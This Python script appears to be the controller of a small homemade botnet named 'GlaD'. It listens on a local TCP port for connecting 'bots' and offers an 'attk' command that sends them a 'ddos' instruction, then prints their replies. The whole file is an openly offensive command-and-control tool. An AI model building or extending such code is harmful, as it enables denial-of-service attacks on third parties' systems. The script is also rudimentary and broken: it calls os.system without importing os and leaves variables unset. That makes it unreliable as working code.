import socket
import math 


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


no_colored =  "\033[0m"   
white_bold =  "\033[1;37m"
blue_bold =   "\033[1;96m"
green_bold =  "\033[1;92m"
red_bold = 	  "\033[1;91m"
yellow_bold = "\033[1;33m"



def start():

	global server_socket

	print('server up')

	server_socket.bind(('127.0.0.1', 6969))
	server_socket.listen(10)

	connection()




def connection():

	global client_socket

	while True:

		(client_socket, addr) = server_socket.accept()
		print('bot connected')

		admin()




#def waiter():


def attack():

	global client_socket, addr

	client_socket.send(bytes('ddos', 'utf-8'))

	while True:

		msg = client_socket.recv(1024)

		if len(msg) > 0:
			print(msg)





def admin():

	global client_socket, addr, no_colored, white_bold, blue_bold, green_bold, red_bold, yellow_bold

	while True:

		print('')

		command = input(yellow_bold+'controll> '+no_colored)

		if command == ('attk'):

			attack()
			break

		elif command == ('help'):


			print('')
			print(green_bold+'attk -----> ddos attack')

		else:

			print(command + ' isnt a command')







def slogan():


	print(yellow_bold)

	os.system("figlet G l a D")
	print("")
	print(blue_bold+"******************************************************")
	print(blue_bold+"* Made by Hadinon                                    *")
	print(blue_bold+"* find more tools on https://github.com/H4din0n      *")
	print(blue_bold+"*                                                    *")
	print(blue_bold+"******************************************************")
	print("")
	#GD586b44f67445532219fee6479274e926fb82b30c9915f79bc179d1b1e263fb6bI
	start()

slogan()